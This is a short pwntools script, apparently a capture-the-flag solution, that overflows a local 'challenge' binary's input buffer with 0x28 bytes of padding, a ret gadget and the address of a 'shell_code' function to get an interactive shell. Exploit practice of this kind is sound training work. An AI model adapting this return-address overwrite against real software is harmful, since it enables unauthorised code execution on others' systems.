#!/usr/bin/env python3
from pwn import *

context.update(arch="amd64", os="linux")

binary = args.BINARY or "./challenge"
elf = ELF(binary, checksec=False)

offset = 0x28
ret_gadget = 0x401173
shell_code = elf.symbols["shell_code"]

payload = flat(
    b"A" * offset,
    ret_gadget,
    shell_code,
)

io = process(elf.path)
io.recvuntil(b"Input: ")
io.send(payload)
io.interactive()

